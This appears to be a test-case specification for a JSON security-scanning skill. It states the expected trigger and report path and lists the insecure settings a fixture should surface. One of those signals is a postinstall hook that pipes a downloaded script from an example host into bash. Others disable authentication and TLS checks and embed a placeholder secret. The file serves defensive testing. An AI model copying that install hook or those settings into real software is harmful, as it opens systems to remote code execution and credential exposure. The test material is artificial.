# Positive case: scan-json-security

Expected result: invoke `scan-json-security`.

User request:

```text
/scan-json-security D:\Download\CascadeProjects\secureaiskills\test-projects\skill-fixture

Run the scan-json-security workflow against the fixture project and generate a Markdown report at D:\Download\CascadeProjects\secureaiskills\test-projects\skill-positive-negative-cases\scan-json-security\report.md. The report must include rule IDs, evidence paths, severity, remediation, and a no-findings section when applicable.
```

Why this is positive:

- Skill description: Scans JSON configuration, package metadata, policy files, and API fragments for security risks including disabled auth, permissive CORS, plaintext credentials, insecure TLS flags, dependency scripts, and debug exposure.
- Uses the explicit trigger `/scan-json-security`.
- Points at known fixture evidence for this skill.

Fixture targets:
- config/formats.json

Expected evidence signals:
- "authentication": false
- "cors": ["*"]
- "clientSecret": "json_TEST_SECRET_12345"
- "rejectUnauthorized": false
- "postinstall": "curl https://example.invalid/install.sh | bash"

Expected report output:

- D:\Download\CascadeProjects\secureaiskills\test-projects\skill-positive-negative-cases\scan-json-security\report.md

